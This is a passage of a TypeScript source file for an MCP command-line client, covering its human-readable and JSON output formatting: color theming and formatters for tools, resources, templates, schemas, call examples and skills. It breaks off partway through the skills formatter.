/**
 * Output formatting for CLI
 * Supports both human-readable and JSON output modes
 */

import chalk from 'chalk';
import type {
  CompleteRequestParams,
  CompleteResult,
  DiscoverResult,
  GetPromptResult,
  Implementation,
  PromptMessage,
  ContentBlock,
  ReadResourceResult,
  ServerCapabilities,
} from '@modelcontextprotocol/client';
import type { OutputMode } from '../lib/index.js';
import type {
  Tool,
  Resource,
  ResourceTemplate,
  Prompt,
  SessionData,
  ServerDetails,
  AnyTask,
  TaskStatus,
  CallToolResult,
  ResourceSubscriptionEntry,
  TransportKind,
  Skill,
} from '../lib/types.js';
import { isExtensionTask } from '../lib/types.js';
import type { DecodedResourceContent } from '../lib/resource-content.js';
import { extractAllTextContent } from './tool-result.js';
import { getSession } from '../lib/sessions.js';
import { getBridgeLogPath } from '../lib/log-reader.js';
import { isModernProtocolVersion, SERVER_INFO_META_KEY } from '../core/protocol.js';
import {
  findMcpExtension,
  declaredExtensionSettings,
  SKILLS_EXTENSION_KEY,
  TASKS_EXTENSION_KEY,
} from '../core/extensions.js';

// Re-export for external use
export { extractAllTextContent } from './tool-result.js';

/**
 * Convert HSL to RGB hex color
 */
function hslToHex(h: number, s: number, l: number): string {
  s /= 100;
  l /= 100;
  const a = s * Math.min(l, 1 - l);
  const f = (n: number): string => {
    const k = (n + h / 30) % 12;
    const color = l - a * Math.max(Math.min(k - 3, 9 - k, 1), -1);
    return Math.round(255 * color)
      .toString(16)
      .padStart(2, '0');
  };
  return `#${f(0)}${f(8)}${f(4)}`;
}

// SF rainbow palette: a prism caught in clear coastal light.
// Hues run from Golden Gate Bridge vermillion (12°) to soft violet (282°),
// at a vivid saturation (78%) kept at high lightness (62%) so the colors stay
// rich and punchy without getting harsh against a dark terminal.
const RAINBOW_HUE_START = 12;
const RAINBOW_HUE_SPAN = 270;
const RAINBOW_SATURATION = 78;
const RAINBOW_LIGHTNESS = 62;

const themeHex = (hue: number): string => hslToHex(hue, RAINBOW_SATURATION, RAINBOW_LIGHTNESS);

/**
 * Themed colors sampled from the same gradient as `rainbow()` so all CLI
 * output shares the soft, fog-filtered palette shown in `mcpc --help`.
 */
export const theme = {
  red: chalk.hex(themeHex(12)), // vermillion (rainbow start)
  yellow: chalk.hex(themeHex(60)),
  // Green is kept a touch deeper than the rainbow so "● live" reads as vivid.
  green: chalk.hex(hslToHex(135, 80, 50)),
  cyan: chalk.hex(themeHex(190)),
  blue: chalk.hex(themeHex(230)),
  magenta: chalk.hex(themeHex(282)), // violet (rainbow end)
};

/** Use the same token palette for real JSON and lexical help examples. */
function colorJsonToken(text: string, kind: 'key' | 'string' | 'literal' | 'number'): string {
  switch (kind) {
    case 'key':
      return theme.cyan(text);
    case 'string':
      return theme.green(text);
    case 'literal':
      return theme.magenta(text);
    case 'number':
      return theme.yellow(text);
  }
}

/** Color JSON and abbreviated help shapes without parsing or changing any characters. */
function colorJsonExample(text: string): string {
  const stack: { object: boolean; key: boolean }[] = [];
  return text.replace(
    /"(?:\\.|[^"\\])*"|\.\.\.|[A-Za-z_$][\w$.-]*\??|-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?|[{}[\]:,]|\s+|./g,
    (token) => {
      const parent = stack.at(-1);
      if (token === '{' || token === '[') {
        stack.push({ object: token === '{', key: token === '{' });
      } else if (token === '}' || token === ']') {
        stack.pop();
      } else if (token === ':' && parent?.object) {
        parent.key = false;
      } else if (token === ',' && parent?.object) {
        parent.key = true;
      } else if (token.startsWith('"')) {
        return colorJsonToken(token, parent?.object && parent.key ? 'key' : 'string');
      } else if (/^(true|false|null)$/.test(token)) {
        return colorJsonToken(token, 'literal');
      } else if (/^-?\d/.test(token)) {
        return colorJsonToken(token, 'number');
      } else if (parent?.object && parent.key && /^[A-Za-z_$]/.test(token)) {
        parent.key = false;
        return colorJsonToken(token, 'key');
      }
      return token;
    }
  );
}

/** Mark an authored example command; shell-quoted JSON keeps the JSON token palette. */
export function commandExample(text: string): string {
  const parts: string[] = [];
  let offset = 0;
  for (const match of text.matchAll(/'([[{][^'\n]*[\]}])'/g)) {
    parts.push(theme.cyan(text.slice(offset, match.index)));
    parts.push("'" + colorJsonExample(match[1] ?? '') + "'");
    offset = match.index + match[0].length;
  }
  parts.push(theme.cyan(text.slice(offset)));
  return parts.join('');
}

/** The dim variant of authored example commands for human next-step hints. */
export function commandHint(text: string): string {
  return chalk.dim(commandExample(text));
}

/** Style only paired, single-line, previously unstyled inline code. */
export function styleInlineCode(text: string): string {
  return text.replace(/`([^`\n\r]+)`/g, (span, content: string) => {
    if (/[\n\r]/.test(content) || content.includes('\x1b')) return span;
    const colored = /^[[{]/.test(content) ? colorJsonExample(content) : theme.cyan(content);
    return grayBacktick() + colored + grayBacktick();
  });
}

/**
 * Apply the soft rainbow gradient across each character of a string.
 */
export function rainbow(text: string): string {
  const len = text.length;
  if (len === 0) return text;

  return text
    .split('')
    .map((char, i) => {
      const hue = RAINBOW_HUE_START + (i / (len - 1)) * RAINBOW_HUE_SPAN;
      return chalk.hex(themeHex(hue))(char);
    })
    .join('');
}

/**
 * Options for formatting output
 */
export interface FormatOptions {
  /** Show full details (for tools-list, shows complete input schema) */
  full?: boolean;
  /** Session name for contextual hints (e.g. @apify) */
  sessionName?: string;
  /** Truncate human-mode output to this many characters */
  maxChars?: number;
}

/**
 * Format output based on the specified mode
 * Human mode output always ends with a newline for visual separation
 */
export function formatOutput(
  data: unknown,
  mode: OutputMode = 'human',
  options?: FormatOptions
): string {
  if (mode === 'json') {
    return formatJson(data);
  }
  let output = formatHuman(data, options);
  // Ensure trailing newline for visual separation in shell (unless ends with code block)
  if (!output.endsWith('````') && !output.endsWith('\n')) {
    output += '\n';
  }
  if (options?.maxChars) {
    output = truncateOutput(output, options.maxChars);
  }
  return output;
}

/**
 * Format data as JSON with optional syntax highlighting
 * Highlighting only applies when outputting to a TTY (not when piping)
 */
export function formatJson(data: unknown): string {
  const json = JSON.stringify(data, null, 2);

  // Only apply syntax highlighting if outputting to a TTY
  if (!process.stdout.isTTY) {
    return json;
  }

  return highlightJson(json);
}

/**
 * Apply syntax highlighting to JSON string
 */
function highlightJson(json: string): string {
  // Match JSON tokens and apply colors
  return json.replace(
    /("(?:\\.|[^"\\])*")\s*:|("(?:\\.|[^"\\])*")|(\b(?:true|false|null)\b)|(-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)/g,
    (
      match,
      key: string | undefined,
      str: string | undefined,
      bool: string | undefined,
      num: string | undefined
    ) => {
      if (key) {
        // Object key (includes the quotes and colon)
        return colorJsonToken(key, 'key') + ':';
      }
      if (str) {
        // String value
        return colorJsonToken(str, 'string');
      }
      if (bool) {
        // Boolean or null
        return colorJsonToken(bool, 'literal');
      }
      if (num) {
        // Number
        return colorJsonToken(num, 'number');
      }
      return match;
    }
  );
}

/**
 * Format data for human-readable output
 */
export function formatHuman(data: unknown, options?: FormatOptions): string {
  if (data === null || data === undefined) {
    return chalk.gray('(no data)');
  }

  // Check if this is a tool call result whose `content` is an array of only
  // `type: "text"` items. If so, render just the texts wrapped in quadruple
  // backticks so the content is unambiguously quoted (and skip any
  // `structuredContent` — the texts are the canonical view).
  const textContent = extractAllTextContent(data);
  if (textContent !== undefined) {
    return `${chalk.gray('````')}\n${textContent}\n${chalk.gray('````')}`;
  }

  // Handle different data types
  if (Array.isArray(data)) {
    if (data.length === 0) {
      return chalk.gray('(empty list)');
    }

    // Try to detect what kind of array this is
    const first = data[0];
    if (first && typeof first === 'object') {
      if ('name' in first && 'inputSchema' in first) {
        return formatTools(data as Tool[], options);
      }
      if ('uriTemplate' in first) {
        return formatResourceTemplates(data as ResourceTemplate[]);
      }
      if ('uri' in first) {
        return formatResources(data as Resource[]);
      }
      if ('name' in first && 'arguments' in first) {
        return formatPrompts(data as Prompt[]);
      }
    }

    // Generic array formatting
    return data.map((item) => formatHuman(item)).join('\n');
  }

  if (typeof data === 'object') {
    // Check if this is a GetPromptResult (has messages array with role/content)
    if (isPromptResult(data)) {
      return formatPromptResult(data);
    }
    return formatObject(data as Record<string, unknown>);
  }

  // Primitive types (string, number, boolean, bigint, symbol)
  if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {
    return String(data);
  }

  // Fallback for other primitive types
  return JSON.stringify(data);
}

/**
 * Format tool annotations as a compact string
 */
export function formatToolAnnotations(annotations: Tool['annotations']): string | null {
  if (!annotations) return null;

  const parts: string[] = [];

  // Add title if different from name (will be shown separately)
  // readOnlyHint and destructiveHint
  if (annotations.readOnlyHint === true) {
    parts.push('read-only');
  } else if (annotations.destructiveHint === true) {
    parts.push(theme.red('destructive'));
  }

  // idempotentHint
  if (annotations.idempotentHint === true) {
    parts.push('idempotent');
  }

  // openWorldHint
  if (annotations.openWorldHint === true) {
    parts.push('open-world');
  }

  return parts.length > 0 ? parts.join(', ') : null;
}

/**
 * Get the task support mode for a tool ('required', 'optional', or undefined)
 */
export function getToolTaskSupport(tool: Tool): string | undefined {
  const toolAny = tool as Record<string, unknown>;
  const execution = toolAny.execution as Record<string, unknown> | undefined;
  return execution?.taskSupport as string | undefined;
}

/**
 * Format tool hints: annotations + task support mode.
 * Returns a string like "destructive, open-world, task:required" or null if empty.
 */
export function formatToolHints(tool: Tool): string | null {
  const parts: string[] = [];

  const annotationsStr = formatToolAnnotations(tool.annotations);
  if (annotationsStr) parts.push(annotationsStr);

  const taskSupport = getToolTaskSupport(tool);
  if (taskSupport && taskSupport !== 'forbidden') parts.push(`task:${taskSupport}`);

  return parts.length > 0 ? parts.join(', ') : null;
}

/**
 * Convert a JSON Schema type definition to a simplified type string
 * e.g., { type: 'string' } -> 'string'
 *       { type: 'array', items: { type: 'number' } } -> 'array<number>'
 *       { type: ['string', 'null'] } -> 'string | null'
 */
export function formatSchemaType(schema: Record<string, unknown>): string {
  if (!schema || typeof schema !== 'object') {
    return 'any';
  }

  const schemaType = schema.type;

  // Handle union types (e.g., ['string', 'null'])
  if (Array.isArray(schemaType)) {
    return schemaType.join(' | ');
  }

  // Handle array type with items
  if (schemaType === 'array' && schema.items) {
    const items = schema.items as Record<string, unknown>;
    const itemType = formatSchemaType(items);
    return `array<${itemType}>`;
  }

  // Handle object type with properties (nested object)
  if (schemaType === 'object' && schema.properties) {
    return 'object';
  }

  // Handle enum
  if (schema.enum && Array.isArray(schema.enum)) {
    const enumValues = schema.enum as unknown[];
    if (enumValues.length <= 5) {
      return enumValues.map((v) => JSON.stringify(v)).join(' | ');
    }
    return `enum(${enumValues.length} values)`;
  }

  // Handle oneOf/anyOf
  if (schema.oneOf && Array.isArray(schema.oneOf)) {
    const types = (schema.oneOf as Record<string, unknown>[]).map(formatSchemaType);
    return types.join(' | ');
  }
  if (schema.anyOf && Array.isArray(schema.anyOf)) {
    const types = (schema.anyOf as Record<string, unknown>[]).map(formatSchemaType);
    return types.join(' | ');
  }

  // Simple type
  if (typeof schemaType === 'string') {
    return schemaType;
  }

  return 'any';
}

/**
 * Format backticks in gray color for subtle Markdown-like display
 */
export function grayBacktick(): string {
  return chalk.gray('`');
}

/**
 * Wrap text in gray backticks with cyan coloring for code-like terms
 * Used for tool names, argument names, and other identifiers
 */
export function inBackticks(text: string): string {
  return `${grayBacktick()}${theme.cyan(text)}${grayBacktick()}`;
}

/**
 * Format a JSON Schema as simplified human-readable args
 * Returns lines like:
 *   * `path`: string [required] - description
 *   * `tail`: number - If provided, returns only the last N lines
 */
export function formatSimplifiedArgs(
  schema: Record<string, unknown>,
  indent: string = ''
): string[] {
  const lines: string[] = [];

  const bullet = chalk.dim('*');

  if (!schema || typeof schema !== 'object') {
    lines.push(`${indent}${bullet} ${chalk.gray('(none)')}`);
    return lines;
  }

  const properties = schema.properties as Record<string, Record<string, unknown>> | undefined;
  const required = (schema.required as string[]) || [];

  if (!properties || Object.keys(properties).length === 0) {
    lines.push(`${indent}${bullet} ${chalk.gray('(none)')}`);
    return lines;
  }

  for (const [name, propSchema] of Object.entries(properties)) {
    const typeStr = formatSchemaType(propSchema);
    const isRequired = required.includes(name);
    const description = propSchema.description as string | undefined;
    const defaultValue = propSchema.default;

    // Build the line: * `name`: type [required] (default: value) - description
    let line = `${indent}${bullet} ${inBackticks(name)}: ${theme.yellow(typeStr)}`;

    if (isRequired) {
      line += ` ${theme.red('[required]')}`;
    }

    if (defaultValue !== undefined) {
      line += chalk.dim(` (default: ${JSON.stringify(defaultValue)})`);
    }

    if (description) {
      line += ` ${chalk.dim('-')} ${description}`;
    }

    lines.push(line);
  }

  return lines;
}

/**
 * Format a list of tools
 * Default: compact format for quick scanning
 * With full option: detailed format with complete input schema
 */
export function formatTools(tools: Tool[], options?: FormatOptions): string {
  if (options?.full) {
    return formatToolsFull(tools);
  }
  return formatToolsCompact(tools, options);
}

/**
 * Convert a full JSON Schema type to a short abbreviation for inline display.
 * e.g., 'string' -> 'str', 'object' -> 'obj', 'array<string>' -> '[str]'
 */
export function shortType(schema: Record<string, unknown>): string {
  if (!schema || typeof schema !== 'object') return 'any';

  const schemaType = schema.type;

  // Handle array type with items → [itemType]
  if (schemaType === 'array' && schema.items) {
    const itemShort = shortType(schema.items as Record<string, unknown>);
    return `[${itemShort}]`;
  }
  // Handle array without items
  if (schemaType === 'array') return '[any]';

  // Handle union types (e.g., ['string', 'null'])
  if (Array.isArray(schemaType)) {
    const filtered = schemaType.filter((t) => t !== 'null');
    if (filtered.length === 1) return shortTypeName(filtered[0] as string);
    return filtered.map((t) => shortTypeName(t as string)).join(' | ');
  }

  // Handle enum
  if (schema.enum && Array.isArray(schema.enum)) return 'enum';

  // Simple type
  if (typeof schemaType === 'string') return shortTypeName(schemaType);

  return 'any';
}

const SHORT_TYPE_MAP: Record<string, string> = {
  string: 'str',
  number: 'num',
  integer: 'int',
  boolean: 'bool',
  object: 'obj',
  array: '[any]',
};

function shortTypeName(type: string): string {
  return SHORT_TYPE_MAP[type] || type;
}

/**
 * Format inline parameter signature for tool summary.
 * Shows at most 3 params (required first, then optional in declaration order).
 * Uses short type names (str, num, obj, bool, [str]).
 */
export function formatToolParamsInline(schema: Record<string, unknown>): string {
  const properties = schema?.properties as Record<string, Record<string, unknown>> | undefined;
  if (!properties || Object.keys(properties).length === 0) return '()';

  const requiredNames = (schema.required as string[]) || [];
  const allNames = Object.keys(properties);

  // Build ordered list: required params first (in declaration order), then optional (in declaration order)
  const ordered: { name: string; required: boolean }[] = [];
  const requiredInOrder = allNames.filter((n) => requiredNames.includes(n));
  const optionalInOrder = allNames.filter((n) => !requiredNames.includes(n));
  for (const name of requiredInOrder) ordered.push({ name, required: true });
  for (const name of optionalInOrder) ordered.push({ name, required: false });

  const MAX_SHOWN = 3;
  const shown = ordered.slice(0, MAX_SHOWN);
  const hidden = ordered.length - shown.length;

  const paramStrings: string[] = shown.map(({ name, required }) => {
    const typeStr = shortType(properties[name] ?? {});
    return required ? `${name}:${typeStr}` : `${name}?:${typeStr}`;
  });

  if (hidden > 0) {
    paramStrings.push('\u2026');
  }

  return `(${paramStrings.join(', ')})`;
}

/**
 * Format tools summary list (shared by compact and full modes)
 * Format: * `tool_name(params)` [annotations]
 */
/**
 * Format a single tool as a compact bullet line: * `tool_name (params)` [annotations]
 */
export function formatToolLine(tool: Tool): string {
  const bullet = chalk.dim('*');
  const params = formatToolParamsInline(tool.inputSchema);
  const hintsStr = formatToolHints(tool);
  const suffix = hintsStr ? ` ${chalk.gray(`[${hintsStr}]`)}` : '';
  return `${bullet} ${grayBacktick()}${theme.cyan(tool.name)} ${params}${grayBacktick()}${suffix}`;
}

function formatToolsSummary(tools: Tool[]): string[] {
  const lines: string[] = [];

  // Header with tool count
  lines.push(chalk.bold(`Tools (${tools.length}):`));

  // Summary list of tools
  for (const tool of tools) {
    lines.push(formatToolLine(tool));
  }

  return lines;
}

/**
 * Format tools in compact form (just the summary list)
 */
function formatToolsCompact(tools: Tool[], options?: FormatOptions): string {
  const lines = formatToolsSummary(tools);

  // Footer hint
  const session = options?.sessionName ? `${options.sessionName} ` : '';
  lines.push('');
  lines.push(
    styleInlineCode(
      `Before calling a tool, get its full details and schema by running: \`mcpc ${session}tools-get <name>\``
    )
  );
  lines.push(
    styleInlineCode(`To get full details for all tools, run: \`mcpc ${session}tools-list --full\``)
  );

  return lines.join('\n');
}

/**
 * Format tools with full details (summary + detailed view for each tool)
 */
function formatToolsFull(tools: Tool[]): string {
  const lines = formatToolsSummary(tools);

  // Detailed view for each tool with separators
  for (const tool of tools) {
    lines.push('');
    lines.push(chalk.dim('---'));
    lines.push(formatToolDetail(tool));
  }

  return lines.join('\n');
}

/**
 * Format a single tool with details (Markdown-like display)
 */
export function formatToolDetail(tool: Tool): string {
  const lines: string[] = [];

  // Title from annotations (if present) - shown as heading above tool name
  const title = tool.annotations?.title;
  if (title) {
    lines.push(chalk.bold(`# ${title}`));
  }

  // Tool header: Tool: `name` [hints]
  const hintsStr = formatToolHints(tool);
  const hintsSuffix = hintsStr ? ` ${chalk.gray(`[${hintsStr}]`)}` : '';
  lines.push(`${chalk.bold('Tool:')} ${inBackticks(tool.name)}${hintsSuffix}`);

  // Input args
  lines.push('');
  lines.push(chalk.bold('Input:'));
  const inputArgs = formatSimplifiedArgs(tool.inputSchema, '');
  lines.push(...inputArgs);

  // Output schema (if present)
  if ('outputSchema' in tool && tool.outputSchema) {
    lines.push('');
    lines.push(chalk.bold('Output:'));
    const outputArgs = formatSimplifiedArgs(tool.outputSchema, '');
    lines.push(...outputArgs);
  }

  // Description in code block
  const description = (tool.description || '').trim();
  if (description) {
    lines.push('');
    lines.push(chalk.bold('Description:'));
    lines.push(chalk.gray('````'));
    lines.push(description);
    lines.push(chalk.gray('````'));
  }

  return lines.join('\n');
}

/**
 * Generate an example placeholder value for a JSON Schema property.
 * Uses the default value if available, otherwise a reasonable placeholder.
 */
function exampleValue(
  propSchema: Record<string, unknown>,
  rootSchema?: Record<string, unknown>,
  depth = 0
): string {
  // Use default value if available
  if (propSchema.default !== undefined) {
    return JSON.stringify(propSchema.default);
  }
  if (propSchema.const !== undefined) {
    return JSON.stringify(propSchema.const);
  }

  // Use first enum value if available
  if (propSchema.enum && Array.isArray(propSchema.enum) && propSchema.enum.length > 0) {
    return JSON.stringify(propSchema.enum[0]);
  }

  // Nested schemas are followed only so deep, so a recursive $ref cannot loop forever
  const canRecurse = depth < MAX_EXAMPLE_DEPTH;
  const recurse = (schema: unknown): string =>
    exampleValue(asSchema(schema) ?? {}, rootSchema, depth + 1);

  // Local references like '#/$defs/Item', as emitted by Pydantic and zod
  if (typeof propSchema.$ref === 'string' && canRecurse) {
    const target = resolveLocalRef(propSchema.$ref, rootSchema);
    if (target) return recurse(target);
  }

  // anyOf/oneOf, e.g. Pydantic's Optional[...]: use the first non-null branch
  const variants = propSchema.anyOf ?? propSchema.oneOf;
  if (Array.isArray(variants)) {
    const variant = variants.find((v) => asSchema(v)?.type !== 'null');
    if (variant) return exampleValue(asSchema(variant) ?? {}, rootSchema, depth);
  }

  // Union types like ['string', 'null'] are reduced to their most likely member
  let schemaType = propSchema.type;
  if (Array.isArray(schemaType)) {
    schemaType = ['string', 'number', 'integer', 'boolean', 'array', 'object'].find((t) =>
      (schemaType as unknown[]).includes(t)
    );
  }

  if (schemaType === 'string') return '"something"';
  if (schemaType === 'number') return '1';
  if (schemaType === 'integer') {
    // Respect minimum if set
    const min = propSchema.minimum as number | undefined;
    return String(min ?? 1);
  }
  if (schemaType === 'boolean') return 'true';
  if (schemaType === 'array') {
    if (!canRecurse) return '[]';
    // Tuples: draft 2020-12 `prefixItems`, or the older array form of `items`
    const tuple = Array.isArray(propSchema.prefixItems) ? propSchema.prefixItems : propSchema.items;
    if (Array.isArray(tuple)) return `[${tuple.map(recurse).join(',')}]`;
    if (asSchema(propSchema.items)) return `[${recurse(propSchema.items)}]`;
    return '[]';
  }
  if (schemaType === 'object') {
    if (!canRecurse) return '{}';
    // Fill in required properties only, so the example passes validation but stays short
    const properties = asSchema(propSchema.properties) ?? {};
    const required = Array.isArray(propSchema.required) ? propSchema.required : [];
    const entries = required
      .filter((name): name is string => typeof name === 'string' && name in properties)
      .map((name) => `${JSON.stringify(name)}:${recurse(properties[name])}`);
    return `{${entries.join(',')}}`;
  }

  return '"something"';
}

const MAX_EXAMPLE_DEPTH = 5;

function asSchema(value: unknown): Record<string, unknown> | undefined {
  return value && typeof value === 'object' && !Array.isArray(value)
    ? (value as Record<string, unknown>)
    : undefined;
}

/**
 * Resolve a same-document JSON pointer reference (e.g. '#/$defs/Item') against the root schema.
 */
function resolveLocalRef(
  ref: string,
  rootSchema: Record<string, unknown> | undefined
): Record<string, unknown> | undefined {
  if (!ref.startsWith('#/')) return undefined;
  let node: unknown = rootSchema;
  for (const segment of ref.slice(2).split('/')) {
    const key = segment.replace(/~1/g, '/').replace(/~0/g, '~');
    node = asSchema(node)?.[key];
  }
  return asSchema(node);
}

/**
 * Wrap a JSON-stringified example value in single quotes if it contains
 * characters that would be mangled by a POSIX shell (double quotes, brackets,
 * braces, spaces, etc.). This ensures the "Call example" line can be
 * copy-pasted into a shell verbatim and still round-trip through the parser.
 *
 * Without this, values like `["markdown"]` lose their inner quotes to shell
 * word-splitting and reach mcpc as `[markdown]`, which is not valid JSON.
 */
function shellSafeExampleValue(jsonValue: string): string {
  // Numbers, booleans, null, and simple identifier-like tokens are safe as-is.
  if (/^[a-zA-Z0-9_.+-]+$/.test(jsonValue)) {
    return jsonValue;
  }
  // Single-quote the value, escaping any embedded single quotes using the
  // POSIX-portable `'\''` trick.
  return `'${jsonValue.replace(/'/g, `'\\''`)}'`;
}

/**
 * Format a tools-call usage example for a tool, showing how to invoke it.
 * Shows required params first, then fills with optional params up to 3 total.
 */
export function formatToolCallExample(tool: Tool, sessionName?: string): string | null {
  const schema = tool.inputSchema as Record<string, unknown> | undefined;
  const properties = schema?.properties as Record<string, Record<string, unknown>> | undefined;
  const session = sessionName || '<@session>';

  // Build --task flag based on task support
  const taskSupport = getToolTaskSupport(tool);
  const taskFlag =
    taskSupport === 'required' ? ' --task' : taskSupport === 'optional' ? ' [--task]' : '';

  const bullet = chalk.dim('*');

  if (!properties || Object.keys(properties).length === 0) {
    // Tool takes no arguments — still show the simple call
    const cmd = `mcpc ${session} tools-call ${tool.name}${taskFlag}`;
    return `${chalk.bold('Call example:')}\n${bullet} ${grayBacktick()}${commandExample(cmd)}${grayBacktick()}`;
  }

  const requiredNames = (schema?.required as string[]) || [];
  const allNames = Object.keys(properties);
  const requiredInOrder = allNames.filter((n) => requiredNames.includes(n));
  const optionalInOrder = allNames.filter((n) => !requiredNames.includes(n));

  // Pick params: all required, then fill optional up to 3 total
  const MAX_EXAMPLE_PARAMS = 3;
  const params: string[] = [...requiredInOrder];
  if (params.length < MAX_EXAMPLE_PARAMS) {
    const remaining = MAX_EXAMPLE_PARAMS - params.length;
    params.push(...optionalInOrder.slice(0, remaining));
  }

  const argParts = params.map((name) => {
    const val = shellSafeExampleValue(exampleValue(properties[name] ?? {}, schema));
    return `${name}:=${val}`;
  });

  const cmd = `mcpc ${session} tools-call ${tool.name} ${argParts.join(' ')}${taskFlag}`;
  return `${chalk.bold('Call example:')}\n${bullet} ${grayBacktick()}${commandExample(cmd)}${grayBacktick()}`;
}

/**
 * Format time ago in human-friendly way
 */
export function formatTimeAgo(isoDate: string | undefined): string {
  if (!isoDate) return '';

  const date = new Date(isoDate);
  const now = new Date();
  const diffMillis = now.getTime() - date.getTime();
  const diffSecs = Math.floor(diffMillis / 1000);
  const diffMins = Math.floor(diffSecs / 60);
  const diffHours = Math.floor(diffMins / 60);
  const diffDays = Math.floor(diffHours / 24);

  if (diffSecs < 60) return 'just now';
  if (diffMins < 60) return `${diffMins}m ago`;
  if (diffHours < 24) return `${diffHours}h ago`;
  if (diffDays === 1) return 'yesterday';
  if (diffDays < 7) return `${diffDays} days ago`;
  if (diffDays < 30) {
    const weeks = Math.floor(diffDays / 7);
    return `${weeks} ${weeks === 1 ? 'week' : 'weeks'} ago`;
  }
  const months = Math.floor(diffDays / 30);
  return `${months} ${months === 1 ? 'month' : 'months'} ago`;
}

/**
 * Format a list of resources with Markdown-like display
 */
export function formatResources(resources: Resource[]): string {
  const lines: string[] = [];

  // Header with resource count
  lines.push(chalk.bold(`Resources (${resources.length}):`));

  // Summary list of resources
  const bullet = chalk.dim('*');
  for (const resource of resources) {
    lines.push(`${bullet} ${inBackticks(resource.uri)}`);
  }

  // Detailed view for each resource with separators
  for (const resource of resources) {
    lines.push('');
    lines.push(chalk.dim('---'));
    lines.push(formatResourceDetail(resource));
  }

  return lines.join('\n');
}

/**
 * Format a single resource with details (Markdown-like display)
 */
export function formatResourceDetail(resource: Resource): string {
  const lines: string[] = [];

  // Resource header: Resource: `uri`
  lines.push(`${chalk.bold('Resource:')} ${inBackticks(resource.uri)}`);

  // Name (if different from URI)
  if (resource.name) {
    lines.push(`${chalk.bold('Name:')} ${resource.name}`);
  }

  // MIME type
  if (resource.mimeType) {
    lines.push(`${chalk.bold('MIME type:')} ${theme.yellow(resource.mimeType)}`);
  }

  // Description in code block
  const description = (resource.description || '').trim();
  if (description) {
    lines.push('');
    lines.push(chalk.bold('Description:'));
    lines.push(chalk.gray('````'));
    lines.push(description);
    lines.push(chalk.gray('````'));
  }

  return lines.join('\n');
}

/**
 * Format a list of resource templates with Markdown-like display
 */
export function formatResourceTemplates(templates: ResourceTemplate[]): string {
  const lines: string[] = [];

  // Header with template count
  lines.push(chalk.bold(`Resource templates (${templates.length}):`));

  // Summary list of templates
  const bullet = chalk.dim('*');
  for (const template of templates) {
    lines.push(`${bullet} ${inBackticks(template.uriTemplate)}`);
  }

  // Detailed view for each template with separators
  for (const template of templates) {
    lines.push('');
    lines.push(chalk.dim('---'));
    lines.push(formatResourceTemplateDetail(template));
  }

  return lines.join('\n');
}

/**
 * Format a single resource template with details (Markdown-like display)
 */
export function formatResourceTemplateDetail(template: ResourceTemplate): string {
  const lines: string[] = [];

  // Template header: Template: `uriTemplate`
  lines.push(`${chalk.bold('Template:')} ${inBackticks(template.uriTemplate)}`);

  // Name (if present)
  if (template.name) {
    lines.push(`${chalk.bold('Name:')} ${template.name}`);
  }

  // MIME type
  if (template.mimeType) {
    lines.push(`${chalk.bold('MIME type:')} ${theme.yellow(template.mimeType)}`);
  }

  // Description in code block
  const description = (template.description || '').trim();
  if (description) {
    lines.push('');
    lines.push(chalk.bold('Description:'));
    lines.push(chalk.gray('````'));
    lines.push(description);
    lines.push(chalk.gray('````'));
  }

  return lines.join('\n');
}

/**
 * Format the contents of a `resources/read` result for human display
 * (the default `resources-read` view). Text content is shown in a fenced
 * block; binary (blob) content is summarized — never dumped to the terminal.
 */
export function formatResourceContents(
  requestedUri: string,
  result: ReadResourceResult,
  options?: { sessionName?: string; maxChars?: number }
): string {
  const lines: string[] = [];

  if (result.contents.length === 0) {
    lines.push(chalk.gray('(resource returned no contents)'));
  }

  result.contents.forEach((item, index) => {
    if (index > 0) {
      lines.push('');
      lines.push(chalk.dim('---'));
    }

    lines.push(`${chalk.bold('Resource:')} ${inBackticks(item.uri || requestedUri)}`);
    if (item.mimeType) {
      lines.push(`${chalk.bold('MIME type:')} ${theme.yellow(item.mimeType)}`);
    }

    if ('text' in item && typeof item.text === 'string') {
      lines.push('');
      lines.push(chalk.gray('````'));
      lines.push(item.text);
      lines.push(chalk.gray('````'));
    } else if ('blob' in item && typeof item.blob === 'string') {
      const bytes = Buffer.from(item.blob, 'base64').length;
      const target = options?.sessionName || '<@session>';
      lines.push(`${chalk.bold('Size:')} ${bytes} bytes (binary)`);
      lines.push('');
      lines.push(chalk.gray('(binary content not shown)'));
      lines.push(
        chalk.dim(
          `↳ save to a file: ${commandHint(`mcpc ${target} resources-read ${quoteShellArg(item.uri || requestedUri)} -o <file>`)}`
        )
      );
    } else {
      lines.push(chalk.gray('(no content)'));
    }
  });

  let output = lines.join('\n');
  if (options?.maxChars) {
    output = truncateOutput(output, options.maxChars);
  }
  return output;
}

/**
 * Human-readable byte size for skill manifests: `2.3 KB`, `18.0 KB`, `1.2 MB`.
 */
function formatByteSize(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

/**
 * One line describing a skill's file manifest: how many files it has and how much they
 * weigh, or that the skill is generated and publishes no manifest at all.
 */
function formatManifestSummary(skill: Skill): string {
  if (skill.resources === 'dynamic') return 'dynamic, no digests published';
  const count = skill.resources.length;
  const bytes = skill.resources.reduce((total, file) => total + file.size, 0);
  return `${count} ${count === 1 ? 'file' : 'files'}, ${formatByteSize(bytes)}`;
}

/**
 * Format the `skills/list` result.
 *
 * Each skill gets its URI on a second line: names are labels rather than identifiers, so
 * two skills served under different prefixes can share one, and the URI is what tells
 * them apart (and what `skills-get` accepts when they do).
 */
export function formatSkills(
  skills: Skill[],
  sessionName?: string,
  options?: FormatOptions
): string {
  if (skills.length === 0) {
    const lines = [chalk.gray('(no skills listed)')];
    if (sessionName) {
      lines.push(
        chalk.dim(
          `↳ a listing may be empty or partial — a skill you know the URI of is still readable: ${commandHint(`mcpc ${sessionName} skills-get skill://<name>/SKILL.md`)}`
        )
      );
    }
    return lines.join('\n');
  }

  const lines: string[] = [];
  const bullet = chalk.dim('*');

  lines.push(chalk.bold(`Skills (${skills.length}):`));
  for (const skill of skills) {
    const desc = skill.frontmatter.description
      ? ` ${chalk.dim('-')} ${skill.frontmatter.description}`
      : '';
    lines.push(`${bullet} ${inBackticks(skill.frontmatter.name)}${desc}`);
    lines.push(`  ${chalk.gray(skill.uri)} ${chalk.gray(`(${formatManifestSummary(skill)})`)}`);
  }

  if (sessionName) {
